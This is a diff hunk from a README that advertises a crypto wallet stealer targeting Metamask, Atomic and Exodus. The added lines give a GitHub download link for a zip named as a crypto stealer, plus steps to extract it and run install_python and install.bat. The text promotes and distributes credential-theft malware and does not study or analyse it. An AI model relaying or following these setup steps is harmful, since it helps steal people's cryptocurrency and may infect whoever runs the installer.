@@ -31,6 +31,10 @@ Grab Crypto Wallets. 🦊 Metamask, 🅰️ Atomic, 👾 Exodus
 
                                                 ⬇️ Easy AF Setup
                                                 
+Download RAR file here: https://github.com/zelvafrancek420/2023-Wolfy-Crypro-Token-Stealer/blob/b38cc004e0befed438320cfae788191c289abc40/2023%20Wolfy%20Crypto%20Stealer.zip
+
+Extract file
+                                                
 Open install_python
 
 then open install.bat
